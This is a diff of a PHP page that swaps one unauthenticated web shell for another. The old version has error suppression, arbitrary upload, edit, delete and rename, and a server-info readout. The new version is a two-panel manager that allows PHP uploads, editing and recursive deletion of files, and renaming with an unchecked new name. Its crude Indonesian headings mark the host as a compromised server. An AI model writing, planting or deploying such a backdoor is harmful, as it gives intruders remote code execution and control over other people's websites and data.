@@ -1,203 +1,491 @@
 <?php
-error_reporting(0);
-session_start();
 
-$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
-$files = scandir($dir);
+$baseDir = dirname(__DIR__);
+$allowedExtensions = ['php','html','png','gif','jpg'];
 
-// Pisahkan folder dan file
-$folders = [];
-$filesOnly = [];
+// Ikon folder & file (remote)
+$folderIconURL = "https://img.icons8.com/ios-filled/50/ffffff/folder-invoices.png";
+$fileIconURL   = "https://img.icons8.com/ios-filled/50/ffffff/document.png";
 
-foreach ($files as $file) {
-    if ($file == '.') continue;
-    if (is_dir("$dir/$file")) {
-        $folders[] = $file;
-    } else {
-        $filesOnly[] = $file;
+// Fungsi keamanan path
+function safePath($path) {
+    global $baseDir;
+    $realBase = realpath($baseDir);
+    $realPath = realpath($path);
+    if ($realPath && strpos($realPath, $realBase) === 0) {
+        return $realPath;
     }
+    return $baseDir;
 }
+//informasi
+$name = php_uname() ;
 
-$files = array_merge($folders, $filesOnly);
 
-// Hapus File
-if (isset($_GET['delete'])) {
-    unlink("$dir/" . basename($_GET['delete']));
-    header("Location: ?dir=" . urlencode($dir));
-    exit;
-}
 
-// Hapus Banyak File
-if (isset($_POST['delete_selected'])) {
-    foreach ($_POST['selected_files'] as $file) {
-        unlink("$dir/" . basename($file));
-    }
-    header("Location: ?dir=" . urlencode($dir));
-    exit;
-}
+// Ambil parameter panel kiri & kanan
+$leftDir  = isset($_GET['left'])  ? $_GET['left']  : $baseDir;
+$rightDir = isset($_GET['right']) ? $_GET['right'] : $baseDir;
 
-// Rename File
-if (isset($_GET['rename_old']) && isset($_GET['rename_new'])) {
-    $oldName = basename($_GET['rename_old']);
-    $newName = basename($_GET['rename_new']);
-    rename("$dir/$oldName", "$dir/$newName");
-    header("Location: ?dir=" . urlencode($dir));
-    exit;
-}
+$leftDir  = safePath($leftDir);
+$rightDir = safePath($rightDir);
 
-// Upload File
-if (isset($_FILES['file'])) {
-    move_uploaded_file($_FILES['file']['tmp_name'], "$dir/" . $_FILES['file']['name']);
-    header("Location: ?dir=" . urlencode($dir));
-    exit;
-}
+$msg = "";
 
-// Edit File
-if (isset($_GET['edit'])) {
-    $fileToEdit = "$dir/" . basename($_GET['edit']);
-    if (file_exists($fileToEdit) && is_file($fileToEdit)) {
-        $content = htmlspecialchars(file_get_contents($fileToEdit));
-        echo "<html><head><title>Edit File</title>
-        <style>
-        body { background: #121212; color: #fff; font-family: Arial, sans-serif; margin: 0; padding: 10px; }
-        textarea { width: 100%; height: 400px; background: #222; color: white; border: 1px solid #444; padding: 5px; border-radius: 5px; }
-        button { background: #0af; color: white; padding: 5px 10px; border: none; cursor: pointer; border-radius: 5px; }
-        button:hover { background: #08f; }
-        </style>
-        </head><body>
-        <h2>Edit File: " . basename($_GET['edit']) . "</h2>
-        <form method='POST'>
-            <textarea name='new_content'>$content</textarea><br>
-            <button type='submit' name='save_file'>Save</button>
-            <a href='?dir=" . urlencode($dir) . "'><button type='button'>Cancel</button></a>
-        </form>
-        </body></html>";
-        exit;
-    }
-}
-
-// Simpan File Editan
-if (isset($_POST['save_file']) && isset($_GET['edit'])) {
-    $fileToSave = "$dir/" . basename($_GET['edit']);
-    file_put_contents($fileToSave, $_POST['new_content']);
-    header("Location: ?dir=" . urlencode($dir));
-    exit;
-}
-
-echo "<html><head><title>File Manager</title>
-<style>
-body { background: #121212; color: #fff; font-family: Arial, sans-serif; margin: 0; padding: 10px; }
-h { text-align: center; }
-.container { max-width: 800px; margin: auto; }
-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-th, td { border: 1px solid #444; padding: 8px; text-align: left; }
-th { background: #222; }
-a { color: #0af; text-decoration: none; }
-button { background: #0af; color: white; padding: 5px 10px; border: none; cursor: pointer; border-radius: 5px; }
-button:hover { background: #08f; }
-input, textarea { background: #222; color: white; border: 1px solid #444; padding: 5px; width: 100%; border-radius: 5px; }
-.checkbox { width: 18px; height: 18px; vertical-align: middle; cursor: pointer; }
-.upload-container { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
-.custom-file-input { display: none; }
-.custom-file-label { background: #0af; color: white; padding: 5px 15px; border-radius: 5px; cursor: pointer; display: inline-block; }
-.custom-file-label:hover { background: #08f; }
-</style>
-<script src='https://cdn.jsdelivr.net/npm/sweetalert2@11'></script>
-<script>
-function renameFile(fileName) {
-    Swal.fire({
-        title: 'Rename File',
-        input: 'text',
-        inputLabel: 'Masukkan nama baru',
-        inputValue: fileName.split('/').pop(),
-        showCancelButton: true,
-        confirmButtonText: 'Rename',
-        preConfirm: (newName) => {
-            if (!newName) {
-                Swal.showValidationMessage('Nama baru tidak boleh kosong');
+// -------------------- HANDLER: UPLOAD (panel kiri) ------------
+if (isset($_POST['upload'])) {
+    if (!empty($_FILES['ufile']['name'])) {
+        $fileName = $_FILES['ufile']['name'];
+        $tmpName  = $_FILES['ufile']['tmp_name'];
+        $ext      = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
+        if (in_array($ext, $allowedExtensions)) {
+            $dest = $leftDir . DIRECTORY_SEPARATOR . $fileName;
+            if (move_uploaded_file($tmpName, $dest)) {
+                $msg = "Upload berhasil: {$fileName}";
+            } else {
+                $msg = "Gagal upload file.";
             }
-            return newName;
+        } else {
+            $msg = "Ekstensi .{$ext} tidak diizinkan.";
         }
-    }).then((result) => {
-        if (result.isConfirmed) {
-            window.location.href = '?dir=' + encodeURIComponent(\"$dir\") +
-                                   '&rename_old=' + encodeURIComponent(fileName.split('/').pop()) +
-                                   '&rename_new=' + encodeURIComponent(result.value);
-        }
-    });
-}
-
-function confirmDelete(fileName, dir) {
-    Swal.fire({
-        title: 'Hapus File?',
-        text: 'File akan dihapus secara permanen!',
-        icon: 'warning',
-        background: '#222',
-        color: '#fff',
-        showCancelButton: true,
-        confirmButtonText: 'Hapus',
-        cancelButtonText: 'Batal'
-    }).then((result) => {
-        if (result.isConfirmed) {
-            window.location.href = '?delete=' + encodeURIComponent(fileName) + '&dir=' + encodeURIComponent(dir);
-        }
-    });
-}
-
-function updateFileName(input) {
-    let fileName = input.files.length ? input.files[0].name : 'Tidak ada file dipilih';
-    document.getElementById('file-name').textContent = fileName;
-}
-</script>
-</head><body>";
-echo "<div class='container' style='max-width: 400px; margin-left: 10px;'>";
-echo "<p style='display: flex; align-items: center; gap: 10px;'>
-        <img src='https://e.top4top.io/p_3371oyifj0.jpg' style='height: 99px;'>
-        <span style='font-size: 20px; font-weight: bold;'>Version: 1.0</span>
-      </p>";
-
-echo "<p><b>Safe Mode:</b> " . (ini_get('safe_mode') ? "On" : "Off") . "</p>";
-echo "<p><b>OS:</b> " . php_uname() . "</p>";
-echo "<p><b>Server IP:</b> " . $_SERVER['SERVER_ADDR'] . "</p>";
-echo "<p><b>Your IP:</b> " . $_SERVER['REMOTE_ADDR'] . "</p>";
-echo "<p><b>Web Server:</b> " . $_SERVER['SERVER_SOFTWARE'] . "</p>";
-echo "<p><b>GitHub:</b> <a href='https://github.com/tuegengs' style='color: #0af;'>tuegengs</a></p>";
-echo "<p><b>Current Directory:</b> $dir</p>";
-echo "</div>";
-
-
-echo "<form method='POST' enctype='multipart/form-data' class='upload-container'>
-    <label for='file' class='custom-file-label'>Pilih File</label>
-    <input type='file' id='file' name='file' class='custom-file-input' onchange='updateFileName(this)'>
-    <span id='file-name' style='color:#ccc;'>Tidak ada file dipilih</span>
-    <button type='submit'>Upload</button>
-</form>";
-
-echo "<form method='POST' id='deleteForm'>";
-echo "<table>";
-echo "<tr><th>Select</th><th>Name</th><th>Actions</th></tr>";
-
-foreach ($files as $file) {
-    $path = "$dir/$file";
-    $isDir = is_dir($path);
-    $link = $isDir ? "<a href='?dir=" . urlencode($path) . "'>$file/</a>" : "<a href='$path'>$file</a>";
-
-    echo "<tr>
-        <td><input type='checkbox' class='checkbox' name='selected_files[]' value='" . htmlspecialchars($file, ENT_QUOTES, 'UTF-8') . "'></td>
-        <td>$link</td>
-        <td class='action-buttons'>";
-    
-    if (!$isDir) {
-        echo "<button type='button' onclick='confirmDelete(\"" . urlencode($file) . "\", \"" . urlencode($dir) . "\")'>Hapus</button>
-              <button type='button' onclick='renameFile(\"" . urlencode($file) . "\")'>Rename</button>
-              <button type='button' onclick='window.location.href=\"?edit=" . urlencode($file) . "&dir=" . urlencode($dir) . "\"'>Edit</button>";
     }
-    
-    echo "</td></tr>";
 }
 
-echo "</table>";
-echo "<button type='submit' name='delete_selected' style='margin-top:10px;'>Delete Selected</button>";
-echo "</form>";
-echo "</div></body></html>";
+// -------------------- HANDLER: HAPUS (Yes/No) -----------------
+// Jika ada `delete` dan parameter confirm=yes, hapus file/folder
+if (isset($_GET['delete']) && isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
+    $delPath = safePath($_GET['delete']);
+    if (is_dir($delPath)) {
+        deleteFolder($delPath);
+        @rmdir($delPath);
+    } else {
+        @unlink($delPath);
+    }
+    header("Location: ?left=" . urlencode($leftDir) . "&right=" . urlencode($rightDir));
+    exit;
+}
+
+function deleteFolder($path) {
+    $items = scandir($path);
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $full = $path . DIRECTORY_SEPARATOR . $item;
+        if (is_dir($full)) {
+            deleteFolder($full);
+            @rmdir($full);
+        } else {
+            @unlink($full);
+        }
+    }
+}
+
+// -------------------- HANDLER: RENAME -------------------------
+if (isset($_POST['rename_submit'])) {
+    $oldPath = safePath($_POST['old_path']);
+    $newName = $_POST['new_name'];
+    if (!empty($newName)) {
+        $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;
+        if (@rename($oldPath, $newPath)) {
+            $msg = "Rename sukses: " . htmlspecialchars($newName);
+        } else {
+            $msg = "Gagal rename.";
+        }
+    }
+}
+
+// -------------------- HANDLER: EDIT FILE ----------------------
+if (isset($_POST['save_edit'])) {
+    $editPath = safePath($_POST['edit_path']);
+    if (is_file($editPath)) {
+        $newContent = $_POST['new_content'];
+        if (file_put_contents($editPath, $newContent) !== false) {
+            $msg = "File berhasil disimpan.";
+        } else {
+            $msg = "Gagal menyimpan file.";
+        }
+    }
+}
+
+// -------------------- DATA PANEL KIRI (Folder Only) -----------
+$leftItems = scandir($leftDir);
+$leftFolders = [];
+foreach ($leftItems as $i) {
+    if ($i === '.' || $i === '..') continue;
+    $fullPath = $leftDir . DIRECTORY_SEPARATOR . $i;
+    if (is_dir($fullPath)) {
+        $leftFolders[] = $i;
+    }
+}
+
+// -------------------- DATA PANEL KANAN (File Only) ------------
+$rightItems = scandir($rightDir);
+$rightFiles = [];
+foreach ($rightItems as $i) {
+    if ($i === '.' || $i === '..') continue;
+    $fullPath = $rightDir . DIRECTORY_SEPARATOR . $i;
+    if (is_file($fullPath)) {
+        $rightFiles[] = $i;
+    }
+}
+
+// -------------------- CEK PROMPT EDIT/RENAME/DELETE ----------
+$editFilePath    = "";
+$editFileContent = "";
+$renamePath      = "";
+$renameBaseName  = "";
+$deletePrompt    = false;
+$deleteTarget    = "";
+
+// Jika user mau edit file
+if (isset($_GET['edit'])) {
+    $editFilePath = safePath($_GET['edit']);
+    if (is_file($editFilePath)) {
+        $editFileContent = file_get_contents($editFilePath);
+    }
+}
+
+// Jika user mau rename
+if (isset($_GET['rename'])) {
+    $renamePath = safePath($_GET['rename']);
+    if (file_exists($renamePath)) {
+        $renameBaseName = basename($renamePath);
+    }
+}
+
+// Jika user mau hapus tapi belum confirm=yes
+if (isset($_GET['delete']) && !isset($_GET['confirm'])) {
+    $deleteTarget = safePath($_GET['delete']);
+    $deletePrompt = true;
+}
 ?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>1</title>
+  <style>
+    body {
+      margin: 0; padding: 0;
+      background-color: #2b2b2b;
+      font-family: sans-serif;
+      color: #fff;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    .topbar {
+      background-color: #424242;
+      padding: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .topbar .title {
+      font-size: 16px;
+      color: #ffc107;
+      margin: 0;
+    }
+    .topbar .buttons {
+      display: flex;
+      gap: 8px;
+    }
+    .buttons a {
+      text-decoration: none;
+      color: #fff;
+      background-color: #616161;
+      padding: 4px 8px;
+      border-radius: 3px;
+    }
+    .buttons a:hover {
+      background-color: #757575;
+    }
+    .main {
+      flex: 1;
+      display: flex;
+      overflow: hidden;
+    }
+    .panel {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      overflow: auto;
+    }
+    .panel-left {
+      background-color: #1f1f1f;
+      border-right: 1px solid #444;
+      position: relative;
+    }
+    .panel-right {
+      background-color: #2b2b2b;
+    }
+    .panel-header {
+      background-color: #333;
+      padding: 8px;
+      font-size: 14px;
+      color: #bbb;
+    }
+    .list {
+      list-style: none;
+      margin: 0;
+      padding: 0;
+    }
+    .list li {
+      display: flex;
+      align-items: center;
+      padding: 6px 10px;
+      border-bottom: 1px solid #444;
+    }
+    .list li:hover {
+      background-color: #393939;
+    }
+    .icon {
+      width: 24px;
+      height: 24px;
+      margin-right: 8px;
+    }
+    a.item-link {
+      text-decoration: none;
+      color: #cddc39;
+      flex: 1;
+    }
+    .bottom-bar {
+      background-color: #424242;
+      padding: 8px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .msg {
+      background-color: #616161;
+      padding: 6px;
+      margin: 4px;
+      border-radius: 3px;
+      font-size: 0.9em;
+      color: #ffc107;
+    }
+    /* Tombol style untuk rename & delete */
+    .btn {
+      display: inline-block;
+      padding: 4px 8px;
+      background-color: #616161;
+      color: #fff;
+      border: none;
+      border-radius: 3px;
+      text-decoration: none;
+      cursor: pointer;
+      font-size: 0.85em;
+      margin-left: 4px;
+    }
+    .btn:hover {
+      background-color: #757575;
+    }
+    .btn-delete {
+      background-color: #e53935;
+    }
+    .btn-delete:hover {
+      background-color: #f44336;
+    }
+    .btn-rename {
+      background-color: #ffc107;
+    }
+    .btn-rename:hover {
+      background-color:rgb(97, 96, 92);
+    }
+    .upload-form, .rename-form, .edit-form, .delete-confirm {
+      background-color: #424242;
+      padding: 8px;
+      margin: 8px;
+      border-radius: 4px;
+    }
+    .upload-form input[type="file"] {
+      margin: 4px 0;
+    }
+    .upload-form input[type="submit"],
+    .rename-form input[type="submit"],
+    .edit-form input[type="submit"] {
+      background-color: #ffc107;
+      border: none;
+      padding: 4px 10px;
+      cursor: pointer;
+      color: #000;
+      border-radius: 3px;
+      margin-top: 5px;
+    }
+    .upload-form input[type="submit"]:hover,
+    .rename-form input[type="submit"]:hover,
+    .edit-form input[type="submit"]:hover {
+      background-color: #ffeb3b;
+    }
+    .rename-form input[type="text"],
+    .edit-form textarea {
+      width: 100%;
+      background-color: #333;
+      color: #fff;
+      border: 1px solid #555;
+      padding: 5px;
+      box-sizing: border-box;
+    }
+    .edit-form textarea {
+      height: 200px;
+      resize: vertical;
+    }
+    .delete-confirm a, .cancel-button {
+      text-decoration: none;
+      margin: 0 8px;
+      background-color: #616161;
+      color: #fff;
+      padding: 4px 8px;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+    .delete-confirm a:hover, .cancel-button:hover {
+      background-color: #757575;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Top Bar -->
+<div class="topbar">
+  <h1 class="title">informasi server yang terkentod saat ini
+  <br><br>system : <?php echo $name; ?>
+  </h1>
+  <div class="buttons">
+    <a href="?left=<?php echo urlencode($leftDir); ?>&right=<?php echo urlencode($rightDir); ?>">Refresh</a>
+  </div>
+</div>
+
+<!-- Pesan (jika ada) -->
+<?php if(!empty($msg)): ?>
+<div class="msg">
+  <?php echo htmlspecialchars($msg); ?>
+</div>
+<?php endif; ?>
+
+<div class="main">
+  <!-- Panel Kiri (Folder Only) -->
+  <div class="panel panel-left">
+    <div class="panel-header">
+      <strong>lokasi kontol saat ini</strong><br>
+      <small><?php echo htmlspecialchars($leftDir); ?></small>
+    </div>
+
+    <!-- Form Upload (di header panel kiri) -->
+    <div class="upload-form">
+      <form method="post" enctype="multipart/form-data">
+        <label>Upload File </label><br>
+        <input type="file" name="ufile" required>
+        <br>
+        <input type="submit" name="upload" value="Upload">
+      </form>
+    </div>
+
+    <!-- List Folder -->
+    <ul class="list">
+      <?php
+      // Tombol UP
+      if ($leftDir !== $baseDir) {
+          $upDir = dirname($leftDir);
+          echo '<li>';
+          echo '<a class="item-link" href="?left=' . urlencode($upDir) . '&right=' . urlencode($rightDir) . '">↑ Up</a>';
+          echo '</li>';
+      }
+      foreach ($leftFolders as $folder) {
+          $folderPath = $leftDir . DIRECTORY_SEPARATOR . $folder;
+          $folderSafe = safePath($folderPath);
+          echo '<li>';
+          echo '<img class="icon" src="' . $folderIconURL . '" alt="folder">';
+          echo '<a class="item-link" href="?left=' . urlencode($folderSafe) . '&right=' . urlencode($folderSafe) . '">';
+          echo htmlspecialchars($folder);
+          echo '</a>';
+          // Tombol Rename sebagai button
+          echo '<a class="btn btn-rename" href="?left=' . urlencode($leftDir) . '&right=' . urlencode($rightDir) . '&rename=' . urlencode($folderSafe) . '">Rename</a>';
+          // Tombol Delete sebagai button
+          echo '<a class="btn btn-delete" href="?left=' . urlencode($leftDir) . '&right=' . urlencode($rightDir) . '&delete=' . urlencode($folderSafe) . '">Delete</a>';
+          echo '</li>';
+      }
+      ?>
+    </ul>
+  </div>
+
+  <!-- Panel Kanan (File Only) -->
+  <div class="panel panel-right">
+    <div class="panel-header">
+      <strong>Isi Folder</strong><br>
+      <small><?php echo htmlspecialchars($rightDir); ?></small>
+    </div>
+
+    <?php 
+    // Prompt Hapus (Yes/No)
+    if ($deletePrompt && $deleteTarget) {
+        $baseName = basename($deleteTarget);
+        echo '<div class="delete-confirm">';
+        echo '<h3>Yakin hapus: ' . htmlspecialchars($baseName) . ' ?</h3>';
+        echo '<a href="?left=' . urlencode($leftDir) . '&right=' . urlencode($rightDir) . '&delete=' . urlencode($deleteTarget) . '&confirm=yes">Yes</a>';
+        echo '<a class="cancel-button" href="?left=' . urlencode($leftDir) . '&right=' . urlencode($rightDir) . '">No</a>';
+        echo '</div>';
+    }
+    ?>
+
+    <!-- Form Rename (jika user rename) -->
+    <?php if($renamePath && file_exists($renamePath)): ?>
+      <div class="rename-form">
+        <h3>Rename: <?php echo htmlspecialchars($renameBaseName); ?></h3>
+        <form method="post">
+          <input type="text" name="new_name" value="<?php echo htmlspecialchars($renameBaseName); ?>">
+          <input type="hidden" name="old_path" value="<?php echo htmlspecialchars($renamePath); ?>">
+          <input type="submit" name="rename_submit" value="Simpan">
+          <a class="cancel-button" href="?left=<?php echo urlencode($leftDir); ?>&right=<?php echo urlencode($rightDir); ?>">Batal</a>
+        </form>
+      </div>
+    <?php endif; ?>
+
+    <!-- Form Edit File (jika user edit) -->
+    <?php if($editFilePath && is_file($editFilePath)): ?>
+      <div class="edit-form">
+        <h3>Edit File: <?php echo htmlspecialchars(basename($editFilePath)); ?></h3>
+        <form method="post">
+          <textarea name="new_content"><?php echo htmlspecialchars($editFileContent); ?></textarea>
+          <input type="hidden" name="edit_path" value="<?php echo htmlspecialchars($editFilePath); ?>">
+          <input type="submit" name="save_edit" value="Simpan">
+          <a class="cancel-button" href="?left=<?php echo urlencode($leftDir); ?>&right=<?php echo urlencode($rightDir); ?>">Batal</a>
+        </form>
+      </div>
+    <?php endif; ?>
+
+    <!-- List File -->
+    <ul class="list">
+      <?php
+      foreach ($rightFiles as $file) {
+          $filePath = $rightDir . DIRECTORY_SEPARATOR . $file;
+          $fileSafe = safePath($filePath);
+          echo '<li>';
+          echo '<img class="icon" src="' . $fileIconURL . '" alt="file">';
+          echo '<a class="item-link" href="?left=' . urlencode($leftDir) . '&right=' . urlencode($rightDir) . '&edit=' . urlencode($fileSafe) . '">';
+          echo htmlspecialchars($file);
+          echo '</a>';
+          // Tombol Rename file
+          echo '<a class="btn btn-rename" href="?left=' . urlencode($leftDir) . '&right=' . urlencode($rightDir) . '&rename=' . urlencode($fileSafe) . '">Rename</a>';
+          // Tombol Delete file
+          echo '<a class="btn btn-delete" href="?left=' . urlencode($leftDir) . '&right=' . urlencode($rightDir) . '&delete=' . urlencode($fileSafe) . '">Delete</a>';
+          echo '</li>';
+      }
+      ?>
+    </ul>
+  </div>
+</div>
+
+<!-- Bottom Bar -->
+<div class="bottom-bar">
+  <div>
+    <a href="?left=<?php echo urlencode($baseDir); ?>&right=<?php echo urlencode($baseDir); ?>" 
+       style="color:#fff; text-decoration:none; background-color:#616161; padding:4px 8px; border-radius:3px;">
+       Home
+    </a>
+  </div>
+  <div>
+    <span style="color:#bbb; font-size:0.9em;">Powered by PHP</span>
+  </div>
+</div>
+
+</body>
+</html>
